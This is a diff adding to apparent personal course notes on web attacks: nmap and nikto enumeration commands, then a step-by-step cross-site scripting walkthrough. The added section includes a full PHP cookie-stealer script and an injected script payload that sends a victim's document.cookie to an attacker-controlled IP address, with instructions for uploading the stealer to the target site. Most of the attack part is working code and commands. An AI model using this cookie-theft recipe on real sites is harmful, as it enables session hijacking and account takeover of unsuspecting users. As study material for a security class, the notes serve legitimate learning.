@@ -99,5 +99,44 @@ DAY2
        js interactive - <script> function myFunction() { document.getElementById("demo").innerHTML = "Paragraph changed.";} </script>
             1. f12 thing
             2. 'console' tab
-            3. can run function, i.e. 'changeText()
+            3. can run function, i.e. 'changeText()'
         
+        
+        
+                 Web Enumeration Steps
+                         The goal of web enumeration is to find out the existing webpages and webdirectories
+                                    - Host Discovery (ping sweep)
+                                    - Host Enumeration (port scan) nmap -Pn -T5 x.x.x.x -p-
+                                    - Service enumeration (-sV|banner.nse) nmap -Pn -T5 x.x.x.x -sV -p <ports> nmap -Pn -T5 x.x.x.x --script=banner.nse -p <ports>
+                                    - Web Enumeration nmap -Pn -T5 -sT -p 80 --script http-enum.nse x.x.x.x nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse x.x.x.x nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse x.x.x.x
+                                      ^ robots.txt finds webpages you can navigate to outside of the normal means
+                                  So what actually is the robots.txt file?
+                                   Robots.txt tells webcrawlers what can and cannot be indexed  Ex. http://foxnews.com/robots.txt
+   
+       nikto v -h xxx.xxx.xxx.xxx *** good stuff
+    
+    Cross-site Scripting (XSS)
+         <script>alert('XSS');</script> 
+            - find a space where you can enter a value, f12 to see if theres a javascript
+            - input that command into said space, try double quotes in single didnt work
+            - if determined the field is vunerable,
+                     vi cookie_stealer.php
+                       <?php
+                       $cookie = $_GET["username"];
+                       $steal = fopen("/var/www/html/(** complete path to upload location (demo: /uploads)**)/cookiefile.txt", "a+");
+                       fwrite($steal, $cookie . "\n");
+                       fclose($steal);
+                       ?>
+            - find file upload prompt on site 
+            - /robots.txt to find potential locations
+            - navigate to said location (yippie? maybe, hopefully)
+            - **
+            - upload cookiefile.txt
+            - navigate back to original input field 
+            - <script>document.location="http://10.50.22.27/uploads/cookies_stealer.php?username="+document.cookie;</script>
+                                         ^^ path to where ever your file uploads ^^     ^^ whatever Get variable was set as
+              
+                              
+    
+    
+    
